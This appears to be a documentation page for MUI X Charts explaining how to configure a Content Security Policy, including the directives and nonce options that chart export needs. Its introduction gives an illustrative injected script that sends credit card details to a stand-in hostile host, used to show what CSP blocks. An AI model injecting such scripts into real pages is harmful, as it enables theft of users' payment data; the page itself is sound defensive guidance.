---
title: Content Security Policy (CSP)
productId: x-charts
---

# Charts - Content Security Policy (CSP)

<p class="description">How to configure a Content Security Policy so MUI X Charts runs correctly and export works when your app restricts script and style sources.</p>

## What is a Content Security Policy (CSP)?

A Content Security Policy (CSP) mitigates cross-site scripting (XSS) attacks by requiring you to allowlist the sources your assets are loaded from.
The server sends this list in a response header.
For example, with a site at `https://example.com`, the CSP header `default-src: 'self';` lets you load assets from `https://example.com/*` and blocks all others.
If part of your site is vulnerable to XSS and renders unescaped user input, an attacker could inject something like:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

The attacker could then run arbitrary code.
A strict CSP header prevents the browser from loading that script.

See the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) for more on CSP.

## Setting up a CSP

MUI X Charts depends on Material UI.
Follow Material UI's [CSP implementation guide](/material-ui/guides/content-security-policy/) to set up a CSP.

### CSP for exporting charts

You can [export charts](/x/react-charts/export/) as images or PDFs with MUI X Charts.
When a CSP is set, you need to configure additional settings for exporting to work.

The export inlines images and fonts as `data:` URIs, and rasterizes the chart through a `blob:` URI.
Enable those URIs by adding these directives to your CSP header:

```text
Content-Security-Policy: img-src 'self' data: blob:; font-src 'self' data:;
```

If your CSP uses a nonce for styles (for example, `style-src-elem 'nonce-<value>'`), you must provide the same nonce when exporting.
The export copies the page styles into the export document, and the browser blocks those styles when they carry no nonce.

Pass the nonce to the `printOptions` and `imageExportOptions` props of the `toolbar` slot.
Each export type reads its own options, so a nonce set only on `printOptions` doesn't apply to the image export.

```tsx
<LineChartPro
  {...settings}
  showToolbar
  slotProps={{
    toolbar: {
      printOptions: { nonce },
      imageExportOptions: [
        { type: 'image/png', nonce },
        { type: 'image/jpeg', nonce },
        { type: 'image/webp', nonce },
      ],
    },
  }}
/>
```

When the copied styles are blocked, the image export fails with an error telling you to set the `nonce` option, and the print export produces an unstyled chart.
Set the `copyStyles` option to `false` to export the chart without the page styles instead.
